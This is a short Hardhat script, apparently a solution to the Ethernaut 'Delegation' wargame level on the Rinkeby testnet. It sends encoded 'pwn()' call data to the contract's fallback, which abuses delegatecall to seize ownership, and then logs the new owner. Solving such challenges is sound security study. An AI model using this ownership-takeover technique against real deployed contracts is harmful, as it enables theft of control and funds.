import { ethers } from "hardhat"

const main = async () => {
  const [deployer] = await ethers.getSigners()
  const targetAddress = "0x1aeB0A17d370374e23426051687f416f26416782"
  const targetAbi = [
    {
      inputs: [
        {
          internalType: "address",
          name: "_delegateAddress",
          type: "address",
        },
      ],
      stateMutability: "nonpayable",
      type: "constructor",
    },
    {
      stateMutability: "nonpayable",
      type: "fallback",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [
        {
          internalType: "address",
          name: "",
          type: "address",
        },
      ],
      stateMutability: "view",
      type: "function",
      constant: true,
      signature: "0x8da5cb5b",
    },
  ]

  const target = await ethers.getContractAt(targetAbi, targetAddress)
  const contract = await ethers.getContract("Delegation")
  // First solution no need contract.
  const ABI = ["function pwn()"]

  const iface = new ethers.utils.Interface(ABI)
  const data = iface.encodeFunctionData("pwn")

  const tx = await deployer.sendTransaction({
    to: targetAddress,
    data,
    gasLimit: 100000,
  })

  // Second solution use contract
  // it turn out that not work when Ethernaut validate.
  // const tx = await contract.pwnNaJa(targetAddress, { gasLimit: 100000 })

  const receipt = await tx.wait()
  console.log(
    `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
  )

  console.log(`Balance of owner ${await target.owner()}`)
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error)
    process.exit(1)
  })
